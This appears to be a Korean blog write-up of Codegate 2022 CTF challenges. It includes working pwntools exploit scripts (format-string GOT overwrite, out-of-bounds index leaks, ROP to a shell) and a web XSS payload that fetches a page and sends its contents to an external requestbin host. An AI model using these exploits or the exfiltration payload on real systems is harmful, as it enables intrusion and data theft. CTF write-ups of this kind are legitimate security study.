---
title: 
categories: [CTF]
tags : [writeup]
date : 2022-02-28 15:52:41 +0900
author:
    name: 
    link: 
toc: false
comments: false
mermaid: false
math: false
---

본선만 갈 생각으로 풀었는데 생각보다 많이 어렵진 않았고

몇문제 놓쳐서 아쉬웠당

# `rev`

---

## lotto

![Untitled](/assets/img/2022-02-28-/Untitled.png)

프로그램을 실행시키면, 탭과 방향키로 움직여서 총 30개의 두자리 숫자를 입력할 수 있고,

command 를 입력받는다.

```cpp
void __fastcall sub_7FF6F5D49910(__int64 *a1)
{
  const char *v1; // rax
  const char *v2; // rax
  __int64 v3; // [rsp+20h] [rbp-28h]
  char v4[24]; // [rsp+30h] [rbp-18h] BYREF

  v1 = (const char *)sub_7FF6F5D4DC90((_QWORD *)*a1);
  if ( !strcmp(v1, "submit") )
  {
    sub_7FF6F5D468A0();
  }
  else
  {
    v2 = (const char *)sub_7FF6F5D4DC90((_QWORD *)*a1);
    if ( !strcmp(v2, "clear") )
    {
      sub_7FF6F5D4DCB0(&unk_7FF6F5D7F360, &unk_7FF6F5D72972);
      sub_7FF6F5D4DCB0(&unk_7FF6F5D7F500, &unk_7FF6F5D72972);
```

문자열리스트를 보다가, submit 을 발견해서 xref 를 보면, 

submit 을 입력하면 특정 함수를 호출하는 것을 볼 수 있었다.

clear 은 숫자를 지워준다.

```cpp
result = range_check((__int64)v32, (__int64)v33, (__int64)v34, (__int64)v35, (__int64)v36);
  if ( result )
  {
    result = first_line(
               (unsigned __int8)v32[0],
               (unsigned __int8)v32[1],
               (unsigned __int8)v32[2],
               (unsigned __int8)v32[3],
               (unsigned __int8)v32[4],
               (unsigned __int8)v32[5]);
    if ( result )
    {
      result = second_line(
                 (unsigned __int8)v33[0],
                 (unsigned __int8)v33[1],
                 (unsigned __int8)v33[2],
                 (unsigned __int8)v33[3],
                 (unsigned __int8)v33[4],
                 (unsigned __int8)v33[5]);
      if ( result )
      {
        result = thid(
                   (unsigned __int8)v34[0],
                   (unsigned __int8)v34[1],
                   (unsigned __int8)v34[2],
                   (unsigned __int8)v34[3],
                   (unsigned __int8)v34[4],
                   (unsigned __int8)v34[5]);
        if ( result )
        {
          result = fourth(
                     (unsigned __int8)v35[0],
                     (unsigned __int8)v35[1],
                     (unsigned __int8)v35[2],
                     (unsigned __int8)v35[3],
                     (unsigned __int8)v35[4],
                     (unsigned __int8)v35[5]);
          if ( result )
          {
            result = fifth(
                       (unsigned __int8)v36[0],
                       (unsigned __int8)v36[1],
                       (unsigned __int8)v36[2],
                       (unsigned __int8)v36[3],
                       (unsigned __int8)v36[4],
                       (unsigned __int8)v36[5]);
            if ( result )
              return MessageBoxA(0i64, lpText, "Congraturation", 0);
          }
        }
      }
    }
  }
  return result;
}
```

해당 함수를 보면, 모든 숫자의 range 가 0~45 인지 검사하고,

각 행마다 함수를 호출해 result 가 1일 때 통과해서

다 통과할 시 messagebox 를 띄워준다. lpText 는 입력값에 따라 플래그가 생성돼서 알맞은 숫자를 입력해야한다.

```cpp
__int64 __fastcall second_line(int a1, int a2, int a3, int a4, int a5, int a6)
{
  if ( a3 + a2 + a1 != 23
    || a3 + 2 * a1 - a2 != 4
    || 3 * a1 + a3 + 2 * a2 != 35
    || 17 * a5 + 7 * a4 != 469
    || 3 * a6 + 2 * a4 - a5 != 143
    || a5 + 3 * a4 - a6 != 25
    || -2 * a4 + a6 + 3 * a5 != 75 )
  {
```

각 함수는 위와 같은 조건문으로 값을 체크하고 있는데, 

≠ → == 으로 바꿔서 z3 돌리면 숫자를 구할 수 있고, 순서대로 알맞게 입력하면 플래그가 뜬다.

```python
from z3 import *

a1,a2,a3,a4,a5,a6=[Int('a%d'%i) for i in range(1,7)]
s=Solver()
s.add(a2 + 2 * a1 == 20)

s.add(a3 + 7 * a1 - a2 == 35)
s.add(7 * a2 - 2 * a1 - a3 == 64)
s.add(5 * a3 + 3 * a1 - a2 == 135)
s.add(3 * a5 + a4 == 156)
s.add(a6 + 3 * a4 - a6 * a5 == -1530)
s.add(a6 + a5 - a4 == 46 )
for i in range(1,7):
    exec(f"s.add(0<a{i},a{i}<45)")
if(s.check()==sat):
    m=s.model()
    for i in range(1,7):
        exec(f"print(int(str(m[a{i}])),end=' ')")
    print('1')
a1,a2,a3,a4,a5,a6=[Int('a%d'%i) for i in range(1,7)]
s=Solver()
s.add(a3 + a2 + a1 == 23,
     a3 + 2 * a1 - a2 == 4,
     3 * a1 + a3 + 2 * a2 == 35,
     17 * a5 + 7 * a4 == 469,
     3 * a6 + 2 * a4 - a5 == 143,
     a5 + 3 * a4 - a6 == 25,
     -2 * a4 + a6 + 3 * a5 == 75)
for i in range(1,7):
    exec(f"s.add(0<a{i},a{i}<45)")

if(s.check()==sat):
    m=s.model()
    for i in range(1,7):
        exec(f"print(int(str(m[a{i}])),end=' ')")
    print('2')

a1,a2,a3,a4,a5,a6=[Int('a%d'%i) for i in range(1,7)]
s=Solver()
s.add(a2 + 2 * a1 == 36,
    a3 + a1 - a2 == 9,
    a2 + a1 - a3 == 1,
    a4 + 2 * a5 == 100,
    a6 + a5 + a4 == 103,
    3 * a5 + a4 - 2 * a6 == 60)
     
for i in range(1,7):
    exec(f"s.add(0<a{i},a{i}<45)")
if(s.check()==sat):
    m=s.model()
    for i in range(1,7):
        exec(f"print(int(str(m[a{i}])),end=' ')")
    print('3')

a1,a2,a3,a4,a5,a6=[Int('a%d'%i) for i in range(1,7)]
s=Solver()
s.add(a2 + 31 * a1 - a3 == 56,
    2 * a2 - a1 - a3 == 1,
    5 * a3 + 3 * a2 + 7 * a1 == 116,
    a6 + a5 - a4 == 54,
    a6 + a4 - a5 == 36,
    a6 + a5 + a4 == 112)
for i in range(1,7):
    exec(f"s.add(0<a{i},a{i}<=45)")
s.add(a5==38)
if(s.check()==sat):
    m=s.model()
    for i in range(1,7):
        exec(f"print(int(str(m[a{i}])),end=' ')")
    print('4')

a1,a2,a3,a4,a5,a6=[Int('a%d'%i) for i in range(1,7)]
s=Solver()
s.add( 3 * a3 + 3 * a1 + 2 * a2 == 140,
    a3 + a2 - 2 * a1 == 20,
    a3 + 7 * a1 - 3 * a2 == 43,
    3 * a6 + a4 + 2 * a5 == 242,
    7 * a6 + 3 * a5 - 7 * a4 == 207,
    11 * a5 + 3 * a4 - 11 * a6 == 71)
for i in range(1,7):
    exec(f"s.add(0<a{i},a{i}<45)")
if(s.check()==sat):
    m=s.model()
    for i in range(1,7):
        exec(f"print(int(str(m[a{i}])),end=' ')")
    print('5')

#3 14 28 36 40 42 
#1 10 12 16 21 44 
#5 26 30 32 34 37 
#2 9 15 29 38 45 
#11 19 23 31 41 43 

# codegate2022{WH3R3_1S_Y0UR_M0N3Y?}
```

---

# `pwn`

---

## cat tail

```cpp
unsigned __int64 check_permissions(void)
{
  const char *v0; // rax
  unsigned int v2; // [rsp+8h] [rbp-88h]
  int v3; // [rsp+Ch] [rbp-84h]
  char *green_block; // [rsp+18h] [rbp-78h]
  char *format; // [rsp+20h] [rbp-70h]
  char *v6; // [rsp+28h] [rbp-68h]
  DIR *dirp; // [rsp+30h] [rbp-60h]
  struct dirent *v8; // [rsp+38h] [rbp-58h]
  __int64 buf[9]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v2 = 1;
  puts("\x1B[1;1H\x1B[2J");
  memset(buf, 0, 64);
  format = (char *)make_green_block("Please enter index\n");
  printf(format);
  printf("\n >>> ");
  read(0, buf, 0x21uLL);
  v3 = atoi((const char *)buf);
  dirp = opendir(".");
  if ( !dirp )
  {
    make_red_block("[!] (Check Permissions) cannot open directory '.'\n");
    exit(-1);
  }
  green_block = (char *)make_green_block("[+] (Check Permissions) Successfully opened the directory.\n\n");
  printf(green_block);
  printf("Your Input: ");
  v6 = (char *)make_green_block((char *)buf);
  printf(v6); // <-- FSB
```

check_permission 함수에서 FSB 가 발생한다.

그래서 libc 를 leak 할 수 있다.

근데 /home/ctf 으로 루트폴더가 바껴서 system 함수를 실행시킬 수 없었다.

```cpp
while ( 1 )
  {
    v6 = readdir(dirp);
    if ( !v6 )
      break;
    if ( v6->d_ino && strcmp(".", v6->d_name) && strcmp("..", v6->d_name) )
    {
      if ( v2 == v1 )
      {
        printf("\t(%d) %s\n", v1, v6->d_name);
        getFileData(v6->d_name, v7);
        if ( !strcmp("flag", v6->d_name) )
          printf("\t\tPermission Error!");
        else
          printf("\t\tbuffer: [%s]", v8);
      }
      ++v1;
    }
  }
```

flag 파일을 출력할 수 있는 부분을 보니까, 파일이름이 flag 면 출력해주지 않는데,

strcmp 가 무조건 0이아닌 다른 값을 반환하게 하면 조건문도 잘 돌아가고,

파일명이 flag 일 때도 파일내용을 출력하게 해줄 수 있었다.

FSB를 발생시킬 수 있는 배열 크기가 작아서 strcmp 함수 전체를 덮지는 못했다.

그래서 libc database 에서 맞는 라이브러리 3개정도 가져와서 아이다로 strcmp 부분을 분석했다.

```
.text:00000000000AC0D0 sub_AC0D0       proc near               ; DATA XREF: strcmp+46↑o
.text:00000000000AC0D0                                         ; __libc_ifunc_impl_list+10BA↓o
.text:00000000000AC0D0 ; __unwind {
.text:00000000000AC0D0                 endbr64
.text:00000000000AC0D4                 mov     ecx, esi
.text:00000000000AC0D6                 mov     eax, edi
.text:00000000000AC0D8                 and     rcx, 3Fh
.text:00000000000AC0DC                 and     rax, 3Fh
.text:00000000000AC0E0                 cmp     ecx, 30h ; '0'
.text:00000000000AC0E3                 ja      short loc_AC130
```

이 함수가 strcmp@got 에 적혀있는 곳인데, 하위 2바이트는 한 번에 덮을 수 있으니

```
.text:00000000000AD4FC                 sub     eax, ecx
.text:00000000000AD4FE                 retn
```

이 부분으로 리턴하게 해서 0이 아닌 다른값이 나오도록 했다.

```python
from pwn import *
import subprocess
import sys

slog = lambda s,n:log.info(": ".join([s,hex(n)]))
context.binary = binary = "./cat_tail"
library="./libc1.so"
# context.log_level='debug'
context.arch="amd64"
b=ELF(binary,checksec=False)
if '1' in sys.argv:
    r = remote("3.39.67.50", 5334)
    lib=ELF(library,checksec=False)
else:
    r = b.process()
    lib = b.libc
r.sendlineafter(">>> ","3")
r.sendlineafter(">>> ","%43$p")

r.recvuntil("Your Input: \x1b[32m")
libc=int(r.recvn(14),16)-lib.sym['__libc_start_main']
libc=libc&~0xfff
slog("libc_ret",libc)
r.sendline()

r.sendlineafter(">>> ","3")
r.sendlineafter(">>> ","%45$p")

r.recvuntil("Your Input: \x1b[32m")
stack=int(r.recvn(14),16)-0xe0

slog("stack",stack)
r.sendline()

prdi=lib.search(asm("pop rdi;ret")).__next__()
binsh=lib.search(b"/bin/sh").__next__()
flag=0x402187

system=libc+0xAD516
system_low = system & 0xffff
system_middle = (system >> 16) & 0xffff
system_high = (system >> 32) & 0xffff
# offset 14
payload = '%{}c'.format(system_low-5).encode()
payload += '%17$hn'.encode()
payload = payload.ljust(0x18,b'x')
payload += p64(b.got['strcmp'])

r.sendlineafter(">>> ","3")
r.sendlineafter(">>> ",payload)
r.sendline()

r.sendlineafter(">>> ","2")
# r.sendlineafter(">>> ","4")

r.interactive()
```

(stack leak 해서 orw rop 하려던 뻘짓코드가 조금 남아있다.)

---

## Dino diary

```cpp
int view_comment()
{
  int v1; // [rsp+Ch] [rbp-4h] BYREF

  printf("input view comment number: ");
  __isoc99_scanf("%d", &v1);
  printf("comment number: %d\n", *(unsigned int *)&com[0x20 * v1]);
  printf("name: %s\n", &com[32 * v1 + 4]);
  return printf("comment: %s\n", &com[32 * v1 + 10]);
}
```

view_comment 함수에서 인덱스 검사를 하지 않고, 음수를 줄 수 있기 때문에

bss 영역에서 com 보다 낮은 주소에 있는 stdout 주소를 leak 할 수 있다.

```cpp
char *modify_comment()
{
  char *result; // rax
  char s[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned int v2; // [rsp+18h] [rbp-8h] BYREF
  size_t nbytes; // [rsp+1Ch] [rbp-4h]

  memset(s, 0, 0x14uLL);
  printf("input modify comment number: ");
  __isoc99_scanf("%d", &v2);
  result = (char *)check_index(v2);
  LODWORD(nbytes) = (_DWORD)result;
  if ( (_DWORD)result )
  {
    printf("input comment: ");
    read(0, s, (unsigned int)nbytes);
    return strcpy(&com[32 * v2 + 10], s);
  }
  return result;
}
size_t __fastcall check_index(int a1)
{
  if ( com[0x20 * a1 + 10] )
  {
    if ( strlen(&com[32 * a1 + 10]) > 0x14 )
      return strlen(&com[32 * a1 + 10]);
    else
      return 20LL;
  }
  else
  {
    puts("Wrong Input");
    return 0LL;
  }
}
```

modify_comment 함수에서는 인덱스를 검사하는데, 

got table 주변 주소로 옮기면 다른 주소가 주변에 있어서 0이 아닌지 검사를 우회할 수 있다.

+10 에 입력받아서 붙어있는 getchar, setvbuf 의 주소를 아무값이나 덮고

scanf@got 을 원샷으로 덮으면, 다음으로 scanf 가 호출되기 떄문에 터지지 않고 쉘을 딸 수 있다.

```python
from pwn import *
import subprocess
import sys

slog = lambda s,n:log.info(": ".join([s,hex(n)]))
context.binary = binary = "./Dino_diary"
library="./libc.so.6"
# context.log_level='debug'
context.arch="amd64"
b=ELF(binary,checksec=False)
if '1' in sys.argv:
    r = remote("52.78.171.46", 8080)
    lib=ELF(library,checksec=False)
else:
    r = b.process()
    lib = b.libc
oneshot=[0x10a41c,0x4f432,0x4f3d5]

r.sendlineafter(": ","3")
r.sendlineafter(": ",b"-28")

r.recvuntil("comment number: ")
r.recvuntil("comment number: ")
low=int(r.recvline().strip())&0xffffffff
r.recvuntil("name: ")
high=u16(r.recvn(2))
libc=(high<<32)|low
libc-=lib.sym['_IO_2_1_stdout_']
slog("libc",libc)

pause()
r.sendlineafter(": ","2")
r.sendlineafter(": ",b"-35")
pay=b'/bin/sh;;;;;;;'+p64(libc+oneshot[0])
r.sendafter("input comment: ",pay)

r.interactive()
```

---

## Gift

```cpp
__isoc99_scanf("%d %d", &input, &no);
  v0 = time(0LL);
  srand(v0);
  if ( point < input || up_down_ticket <= 0 )
  {
    puts("NOP!!!");
  }
  else
  {
    v4 = random() % 50;
    v5 = random() % 50;
    printf("Your number: %d Lucky number: %d\n", v5, v4);
    if ( v4 > v5 && no == 2 )
    {
      point += 2 * input;
      printf("DOWN~! Congratulations!! point: %d\n", (unsigned int)point);
      --up_down_ticket;
    }
    else if ( v4 < v5 && no == 1 )
    {
      point += 2 * input;
      printf("UP~! Congratulations!! point: %d\n", (unsigned int)point);
      --up_down_ticket;
    }
    else
    {
      puts("Wrong....point thx");
      point -= 2 * input;
      --up_down_ticket;
    }
  }
  return __readfsqword(0x28u) ^ v6;
}
```

updown 게임에서, 두 번째 입력값이 1 또는 2가 아니면, point 에서 2*(첫 번째 입력) 만큼 뺀다.

input 은 signed int 기 때문에 음수를 입력해서 point 를 증가시켜 flag 를 구매할 수 있다.

```cpp
from pwn import *
r=remote("3.39.28.41", 8888)
r.sendline("sn")
r.sendline("3")
r.sendline("5")
r.sendline("-50000000 3")
r.sendline("2")
r.sendline("6")

r.interactive()
```

---

## mungchistack

thread 에서 start_routine 으로 eat, play, clean 메뉴를 호출할 수 있는 무한루프가 돌아간다.

`satiety == 0 && clean == 7 && heappy == 28` → `eventCall()` 호출

`satiety == 6 && clean == 2 && happy == 2` → `eventHunt()` 호출

- eat : satiety+4, clean-1, happy+1
- play : satiety -2, clean -2, happy+3
- clean : satiety -2, clean +4

저 두 함수를 호출하기 위해서 메뉴를 어떻게 조합할지 방정식을 세워본 결과

`eat*7 | play*7 | clean*7 → eventCall()`

`eat*2 | clean*1 → eventHunt()`

각 함수에서 일어나는 취약점에 대해 알아보자.

`eventHunt()`

```cpp
__isoc99_scanf("%16s", nptr);
  HIDWORD(v2) = atoi(nptr);
  if ( v2 < 0 && SHIDWORD(v2) > 13 )
    puts("\x1B[32m[3]ERROR!\x1B[0m");
  puts("\x1B[1;1H\x1B[2J");
  puts(
    "\n"
    "    /\\_/\\           ___\n"
    "   = o_o =_______    \\ \\  -mungchi-\n"
    "    __^      __(  \\.__) )\n"
    "(@)<_____>__(_____)____/");
  printf("\n\nThe cat has caught something. ");
  write(1, "[", 1uLL);
  write(1, &v4 + SHIDWORD(v2), 8uLL);
  write(1, "]\n", 2uLL);
```

v2 에 입력한 인덱스가 들어가는데, 인덱스 검사 루틴이 있지만 제대로 거르지 못하고,

게다가 return 도 안해서 인덱스 제한 없이 스택에서 leak 할 수 있다.

main thread 가 아니라서 libc_start_main 을 leak 할 수는 없지만 

리턴주소중에 clone 함수의 주소가 있었다. 

bof 를 이용할 것이기 때문에 canary 도 leak 해줬다.

`eventCall()`

```cpp
length = NAME_LENGTH; // NAME_LENGTH
  puts("\x1B[1;1H\x1B[2J");
  puts("* Now you can call a cat. *");
  puts("Please select the name of the cat you want to call");
  puts("\x1B[32mindex [1]\x1B[0m : mungchi(default)");
  puts("\x1B[32mindex [2]\x1B[0m : Another cat(undefined)");
  printf("\n >>> ");
  __isoc99_scanf("%16s", nptr);
  v5 = atoi(nptr);
  if ( v5 == 1 )
  {
    printf("\x1B[32mCall mungchi\x1B[0m");
  }
  else if ( v5 <= 2 )
  {
    v7[v5 - 1] = 0LL;
    v0 = v5 - 1;
    v1 = 16 * ((length + 23) / 0x10);
    while ( v4 != &v4[-(v1 & 0xFFFFFFFFFFFFF000LL)] )
      ;
    v2 = alloca(v1 & 0xFFF);
    if ( (v1 & 0xFFF) != 0 )
      *(_QWORD *)&v4[(v1 & 0xFFF) - 8] = *(_QWORD *)&v4[(v1 & 0xFFF) - 8];
    v7[v0] = v4;
    setName(v7[v5 - 1]);
  }
```

alloca 의 인자로 `16 * ((length + 23) / 0x10);` 이 값이 들어가는데, 

0 을 입력해서 v5 가 0이되게 하면 `v7[v5 - 1] = 0LL;` 여기서 length 변수를 0으로 만들 수 있다.

setName 함수에서는 0x1000 만큼 입력받을 수 있으니 위에서 구한 주소를 바탕으로 ROP 하면 된다.

```python
from pwn import *
import subprocess
import sys

slog = lambda s,n:log.info(": ".join([s,hex(n)]))
context.binary = binary = "./mungchistack"
library="./libc-2.31.so"
# context.log_level='debug'

context.arch="amd64"
b=ELF(binary,checksec=False)
if '1' in sys.argv:
    r = remote("3.39.32.143", 5333)
    lib=ELF(library,checksec=False)
else:
    r = b.process()
    lib = b.libc

# 0 7 28 -> eventCall (7,7,7)
# 6 2 2  -> eventHunt (2,0,1)
r.sendline()
def eventHunt():
    r.sendlineafter(">>> ",b"1")
    r.sendlineafter(">>> ",b"1")
    r.sendlineafter(">>> ",b"3")
def eventCall():
    for i in range(7):
        r.sendlineafter(">>> ",b"1")
        r.sendlineafter(">>> ",b"2")
        r.sendlineafter(">>> ",b"3")
eventHunt()
r.sendlineafter(">>> ",b"45")
r.recvuntil(". [")
libc=u64(r.recvn(6).ljust(8,b'\x00'))-lib.sym['clone']
libc&=~0xff
slog("libc",libc)
eventHunt()
r.sendlineafter(">>> ",b"41")
r.recvuntil(". [")
canary=u64(r.recvn(8))
slog("canary",canary)
eventCall()
r.sendlineafter(">>> ",b"0")
prdi=next(lib.search(asm("pop rdi;ret")))+libc
binsh=next(lib.search(b"/bin/sh"))+libc
system=libc+lib.sym['system']
pay=b'x'*(0x58)
pay+=p64(canary)
pay+=p64(0)
pay+=p64(prdi)
pay+=p64(binsh)
pay+=p64(prdi+1)
pay+=p64(system)
r.sendlineafter(">>> ",pay)
r.interactive()
```

---

# `misc`

---

## UDgame

```python
from pwn import *

r=remote("52.79.50.189",4321)
context.log_level='debug'
r.recvuntil("> ")
r.sendline("y")
low=1
high=1000000000000
guess=1000000000000//2
prev=guess
while(1):
    mid=(low+high)//2
    r.sendlineafter("write your guess :",str(mid).encode())
    out=r.recvline()
    print(mid)
    if b"DOWN" in out:
        print("DOWN")
        high=mid-1
    elif b"UP" in out:
        print("UP")
        low=mid+1
    else:
        low=1
        high=1000000000000
        # r.interactive()
        
# codegate20
# 22{483d5dbac7263
# ccc95f0978dad75a
# ca2f802c9031a36d
# c4971ac01dd7fbf7
# 3072b34f56ad4404
# 222eaf6ca0a68dfb
# 998bb80}··
```

이분탐색 알고리즘으로 찾으면 된다.

너무 오래걸려서 pyjail 문제일지도 몰라서 끄고 해보려는데 플래그가 나왔다

---

# `web`

---

## ohmypage

```jsx

fetch('/mypage').then(function(r){return r.text()}).then(function(x){window.location.replace('https://eordt9igpz30nym.m.pipedream.net/'+btoa(x))})
```

위와 같이 fetch 로 mypage로 요청을 보낸 후, response data 를 requestbin 으로 보내면 flag 가 들어있다.

처음에는 단순히 쿠키를 보내려 했지만, mypage 에 있는 문구가 나오길래

mypage 리턴값을 서버로 보냈다.

`<img src=x onerror=~ />` → ~ 부분에 자바스크립트 코드 넣고 url encoding 해서 report